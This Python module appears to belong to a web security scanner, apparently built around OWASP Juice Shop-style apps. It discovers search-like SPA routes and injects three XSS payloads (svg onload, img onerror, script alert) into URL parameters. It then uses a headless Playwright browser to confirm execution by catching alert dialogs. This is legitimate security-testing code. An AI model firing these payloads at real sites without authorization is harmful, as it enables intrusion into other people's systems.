from __future__ import annotations

import time
from dataclasses import dataclass
from typing import Any, Iterable, Mapping
from urllib.parse import quote

from juicechain.utils.logging import get_logger


logger = get_logger(__name__)

_DOM_XSS_ROUTE_KEYWORDS: tuple[str, ...] = ("search", "query", "find")
_DOM_XSS_DEFAULT_PARAM = "q"
_DOM_XSS_PAYLOADS: tuple[str, ...] = (
    "\"><svg/onload=alert('JC_DOM_XSS')>",
    "<img src=x onerror=alert('JC_DOM_XSS')>",
    "<script>alert('JC_DOM_XSS')</script>",
)


@dataclass(frozen=True)
class DomXssTarget:
    url_template: str
    param_name: str
    description: str


@dataclass
class DomXssResult:
    ok: bool
    url: str
    payload: str
    dialog_message: str | None
    error: str | None
    duration_ms: int
    param_name: str | None = None
    description: str | None = None


def build_search_fragment_url(base: str, payload: str) -> str:
    """Build a hash-route search URL containing an encoded payload.

    Args:
        base: Target base URL.
        payload: Raw payload string.

    Returns:
        Full URL for `/#/search?q=...` style probing.

    Raises:
        ValueError: If URL template expansion fails.
    """
    target = DomXssTarget(
        url_template="{base}/#/search?q={payload}",
        param_name="q",
        description="SPA search route",
    )
    return build_dom_xss_url(base, target, payload)


def build_dom_xss_url(base: str, target: DomXssTarget, payload: str) -> str:
    """Build a concrete DOM-XSS probe URL from a target template.

    Args:
        base: Target base URL.
        target: URL template and parameter metadata.
        payload: Raw payload string.

    Returns:
        Fully formatted probe URL with URL-encoded payload.

    Raises:
        ValueError: If template rendering fails.
    """
    enc = quote(payload, safe="")
    base_clean = (base or "").rstrip("/")
    try:
        return target.url_template.format(base=base_clean, payload=enc)
    except Exception as e:
        raise ValueError(
            f"invalid dom xss url template: {target.url_template!r} ({type(e).__name__}: {e})"
        ) from e


def _append_template_param(url_template: str, param_name: str) -> str:
    sep = "&" if "?" in url_template else "?"
    return f"{url_template}{sep}{param_name}={{payload}}"


def _dom_xss_target_from_route(route: str) -> DomXssTarget | None:
    r = (route or "").strip()
    if not r:
        return None

    rl = r.lower()
    if not any(kw in rl for kw in _DOM_XSS_ROUTE_KEYWORDS):
        return None

    # Hash-route target: /#/search or #/search
    if r.startswith("/#/") or r.startswith("#/") or r.startswith("#"):
        if r.startswith("/#/"):
            route_path = r[2:]
        elif r.startswith("#/"):
            route_path = r[1:]
        else:
            route_path = r[1:]
        if not route_path.startswith("/"):
            route_path = "/" + route_path.lstrip("/")
        tpl = _append_template_param(f"{{base}}/#{route_path}", _DOM_XSS_DEFAULT_PARAM)
        return DomXssTarget(
            url_template=tpl,
            param_name=_DOM_XSS_DEFAULT_PARAM,
            description=f"SPA hash route {route_path}",
        )

    # Query-route target: /search
    route_path = r if r.startswith("/") else "/" + r
    tpl = _append_template_param(f"{{base}}{route_path}", _DOM_XSS_DEFAULT_PARAM)
    return DomXssTarget(
        url_template=tpl,
        param_name=_DOM_XSS_DEFAULT_PARAM,
        description=f"SPA route {route_path}",
    )


def auto_discover_dom_xss_targets(
    scan_doc: Mapping[str, Any],
    *,
    extra_targets: Iterable[DomXssTarget] | None = None,
) -> list[DomXssTarget]:
    """Discover candidate DOM-XSS browser targets from scan results.

    Args:
        scan_doc: Scan JSON document (`scan` output payload or inner data).
        extra_targets: Optional manually provided target list.

    Returns:
        De-duplicated candidate target list keyed by template and parameter.
    """
    enum = scan_doc.get("enum") or {}
    crawler = (enum.get("crawler") or {}) if isinstance(enum, Mapping) else {}
    spa = (crawler.get("spa") or {}) if isinstance(crawler, Mapping) else {}
    routes = spa.get("routes_from_assets") or []

    out: list[DomXssTarget] = []
    if isinstance(routes, list):
        for raw in routes:
            if not isinstance(raw, str):
                continue
            t = _dom_xss_target_from_route(raw)
            if t is not None:
                out.append(t)

    if extra_targets is not None:
        for t in extra_targets:
            if isinstance(t, DomXssTarget):
                out.append(t)

    # de-dup by template + param
    uniq: dict[tuple[str, str], DomXssTarget] = {}
    for t in out:
        uniq[(t.url_template, t.param_name)] = t
    return list(uniq.values())


def verify_dom_xss(
    *,
    base: str,
    targets: Iterable[DomXssTarget],
    headless: bool = True,
    timeout_ms: int = 8000,
) -> list[DomXssResult]:
    """Verify DOM-XSS by capturing browser dialogs from payload execution.

    Args:
        base: Target base URL.
        targets: Candidate URL templates to probe.
        headless: Whether Playwright runs in headless mode.
        timeout_ms: Navigation timeout for each probe request.

    Returns:
        List of successful findings and/or runtime dependency errors.
    """
    t0 = time.time()
    target_list = [t for t in targets if isinstance(t, DomXssTarget)]
    if not target_list:
        logger.info("dom-xss skipped: no candidate targets")
        return []

    logger.info("dom-xss browser verification start: base=%s targets=%s", base, len(target_list))

    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:
        logger.warning("dom-xss browser dependency missing: %s", e)
        return [
            DomXssResult(
                ok=False,
                url="",
                payload="",
                dialog_message=None,
                error=f"playwright not available: {type(e).__name__}: {e}",
                duration_ms=int((time.time() - t0) * 1000),
            )
        ]

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=headless)
        page = browser.new_page()

        dialog_msgs: list[str] = []

        def on_dialog(d: Any) -> None:
            try:
                dialog_msgs.append(d.message)
                d.dismiss()
            except Exception:
                pass

        page.on("dialog", on_dialog)

        findings: list[DomXssResult] = []
        try:
            for target in target_list:
                for payload in _DOM_XSS_PAYLOADS:
                    url = build_dom_xss_url(base, target, payload)
                    dialog_count_before = len(dialog_msgs)
                    page.goto(url, wait_until="networkidle", timeout=timeout_ms)
                    # Give the frontend a short time window to trigger sink execution.
                    page.wait_for_timeout(800)

                    if len(dialog_msgs) > dialog_count_before:
                        logger.info("dom-xss dialog captured: url=%s", url)
                        findings.append(
                            DomXssResult(
                                ok=True,
                                url=url,
                                payload=payload,
                                dialog_message=dialog_msgs[-1],
                                error=None,
                                duration_ms=int((time.time() - t0) * 1000),
                                param_name=target.param_name,
                                description=target.description,
                            )
                        )

            logger.info("dom-xss verification finished: findings=%s", len(findings))
            return findings

        except Exception as e:
            logger.warning("dom-xss verification runtime error: %s", e)
            return [
                DomXssResult(
                    ok=False,
                    url="",
                    payload="",
                    dialog_message=None,
                    error=f"{type(e).__name__}: {e}",
                    duration_ms=int((time.time() - t0) * 1000),
                )
            ]
        finally:
            try:
                browser.close()
            except Exception:
                pass


def verify_dom_xss_on_search(
    *,
    base: str,
    headless: bool = True,
    timeout_ms: int = 8000,
) -> DomXssResult:
    """Run DOM-XSS verification against the default search route only.

    Args:
        base: Target base URL.
        headless: Whether Playwright runs in headless mode.
        timeout_ms: Navigation timeout for each probe request.

    Returns:
        First DOM-XSS verification result for the built-in search route target.
    """
    t0 = time.time()
    target = DomXssTarget(
        url_template="{base}/#/search?q={payload}",
        param_name="q",
        description="SPA search route",
    )
    results = verify_dom_xss(
        base=base,
        targets=[target],
        headless=headless,
        timeout_ms=timeout_ms,
    )
    if not results:
        payload = _DOM_XSS_PAYLOADS[0]
        return DomXssResult(
            ok=False,
            url=build_dom_xss_url(base, target, payload),
            payload=payload,
            dialog_message=None,
            error=None,
            duration_ms=int((time.time() - t0) * 1000),
            param_name=target.param_name,
            description=target.description,
        )
    return results[0]
